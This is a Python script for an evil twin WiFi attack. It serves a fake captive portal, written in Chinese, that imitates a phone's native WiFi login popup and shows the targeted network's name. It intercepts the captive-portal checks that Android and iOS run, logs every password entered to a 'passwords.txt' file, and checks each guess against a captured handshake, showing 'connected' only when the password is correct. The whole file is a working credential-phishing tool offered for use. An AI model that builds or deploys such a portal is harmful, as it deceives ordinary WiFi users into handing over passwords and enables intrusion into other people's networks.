#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Evil Twin Captive Portal - 仿手机系统原生 WiFi 认证弹窗
- 页面 SSID 动态读取 current_ssid 文件（由 evil_control.py 在攻击时写入），
  攻击哪个 WiFi 就显示哪个名字，不再写死
- 密码 POST 到 /submit 后：先记录，再调用控制台 /api/verify 自动验证
- 验证通过 → 显示"连接成功"（控制台随后自动关闭假 AP）
- 验证失败 → 显示"密码错误，请重新输入"（表单保留可重输）
- 严格模式：验证服务不可用时也不放行，显示"网络繁忙，请稍后重试"

配置：环境变量 PORTAL_LOG / PORTAL_SSID_FILE / CTRL_VERIFY_URL（见 config.env.example）
"""
import os
import http.server
import socketserver
import urllib.parse
import urllib.request
import json

LOG        = os.environ.get("PORTAL_LOG", "/opt/evil-twin/passwords.txt")
SSID_FILE  = os.environ.get("PORTAL_SSID_FILE", "/opt/evil-twin/current_ssid")
VERIFY_URL = os.environ.get("CTRL_VERIFY_URL", "http://127.0.0.1:8090/api/verify")
PORT       = 80


def get_ssid():
    """动态读取当前攻击目标 SSID；文件缺失时返回通用占位"""
    try:
        with open(SSID_FILE, encoding="utf-8", errors="ignore") as f:
            s = f.read().strip()
        return s or "WiFi"
    except Exception:
        return "WiFi"


def render_login(err=False, busy=False):
    """err=True 密码错误；busy=True 验证服务不可用（严格不放行）"""
    ssid = get_ssid()
    err_html = ""
    if busy:
        err_html = '<div class="err show">&#x274C; 网络繁忙，请稍后重试</div>'
    elif err:
        err_html = '<div class="err show">&#x274C; 密码错误，请重新输入</div>'
    return PAGE_LOGIN.replace("%SSID%", ssid).replace("%ERR%", err_html)


PAGE_LOGIN = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>WiFi 网络认证</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Microsoft YaHei',sans-serif;
min-height:100vh;background:#f2f3f5;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#fff;border-radius:14px;width:100%;max-width:400px;overflow:hidden;
box-shadow:0 8px 32px rgba(0,0,0,.12);animation:fadein .3s ease}
@keyframes fadein{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
.top{background:linear-gradient(135deg,#2b7ff0,#1b5fd9);padding:26px 20px 20px;text-align:center;color:#fff}
.wifi-ico{width:64px;height:64px;margin:0 auto 12px;background:rgba(255,255,255,.18);
border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:30px;
backdrop-filter:blur(4px)}
.ssid{font-size:19px;font-weight:600;letter-spacing:.5px;word-break:break-all}
.tip{font-size:13px;color:#dbe7ff;margin-top:5px}
.body{padding:24px 22px 26px}
.err{background:#fdecec;color:#d43d3d;border-radius:10px;padding:10px 12px;font-size:13px;
margin-bottom:14px;display:none}
.err.show{display:block}
.field{position:relative;margin-bottom:14px}
.field input{width:100%;padding:14px 16px;border:1.5px solid #e2e6ee;border-radius:10px;font-size:16px;
outline:none;transition:.2s;background:#fafbfd}
.field input:focus{border-color:#2b7ff0;background:#fff}
.btn{width:100%;padding:14px;background:#2b7ff0;color:#fff;border:none;border-radius:10px;
font-size:16px;font-weight:600;cursor:pointer;transition:.2s}
.btn:hover{background:#1f6ae0}
.btn:active{transform:scale(.98)}
.foot{display:flex;justify-content:space-between;margin-top:18px;font-size:12px;color:#9aa3b2}
.foot a{color:#5b8def;text-decoration:none}
</style>
</head>
<body>
<div class="card">
<div class="top">
<div class="wifi-ico">&#x1F4F6;</div>
<div class="ssid">%SSID%</div>
<div class="tip">需要认证后才能上网</div>
</div>
<div class="body">
%ERR%
<form method="POST" action="/submit" id="frm">
<div class="field">
<input type="password" name="password" id="pwd" placeholder="请输入 WiFi 密码" autofocus required autocomplete="off">
</div>
<button type="submit" class="btn" id="btn">连 接</button>
</form>
<div class="foot">
<span>此网络需要认证</span>
<a href="#">帮助</a>
</div>
</div>
</div>
</body>
</html>"""

PAGE_OK = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>连接成功</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Microsoft YaHei',sans-serif;
min-height:100vh;background:#f2f3f5;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#fff;border-radius:14px;padding:40px 32px;text-align:center;max-width:380px;width:100%;
box-shadow:0 8px 32px rgba(0,0,0,.12)}
.ok{width:72px;height:72px;margin:0 auto 18px;background:linear-gradient(135deg,#22c55e,#16a34a);
border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:36px;color:#fff;
box-shadow:0 8px 24px rgba(34,197,94,.35)}
h2{font-size:19px;color:#1c2430;margin-bottom:8px}
p{font-size:14px;color:#6b7a90}
.spinner{width:16px;height:16px;border:3px solid #e3e9f2;border-top-color:#22c55e;border-radius:50%;
display:inline-block;vertical-align:-3px;margin-right:6px;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="card">
<div class="ok">&#x2714;</div>
<h2>连接成功</h2>
<p><span class="spinner"></span>正在获取网络配置，请稍候...</p>
</div>
</body>
</html>"""


def verify_password(pwd):
    """调用控制台验证密码是否匹配历史真实握手"""
    try:
        req = urllib.request.Request(
            VERIFY_URL,
            data=json.dumps({"password": pwd}).encode("utf-8"),
            headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=8) as r:
            return json.loads(r.read().decode("utf-8"))
    except Exception as e:
        print("verify error: %s" % e, flush=True)
        return None


class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        # 系统 captive portal 检测请求（安卓/iOS 自动探测）→ 302 到首页，触发系统弹认证页
        p = self.path.lower()
        if any(k in p for k in ("generate_204", "gen_204", "connectivity", "captive",
                                "hotspot-detect", "success.txt", "ncsi")):
            self.send_response(302)
            self.send_header("Location", "/")
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        body = render_login().encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(length).decode("utf-8", "ignore")
        params = urllib.parse.parse_qs(data)
        pwd = params.get("password", ["<empty>"])[0]
        line = "PASSWORD CAPTURED: %s\n" % pwd
        print(line, flush=True)
        with open(LOG, "a") as f:
            f.write(line)

        if pwd and pwd != "<empty>":
            v = verify_password(pwd)
            if v is not None and v.get("ok"):
                body = PAGE_OK.encode("utf-8")
            elif v is not None and not v.get("ok"):
                # 密码错误：重新显示登录页 + 错误提示
                body = render_login(err=True).encode("utf-8")
            else:
                # 验证服务不可用：不放行，按密码错误处理（严格模式）
                body = render_login(busy=True).encode("utf-8")
        else:
            # 空密码：直接返回错误页
            body = render_login(err=True).encode("utf-8")

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("0.0.0.0", PORT), Handler) as httpd:
    print("Captive portal listening on port %d" % PORT, flush=True)
    httpd.serve_forever()
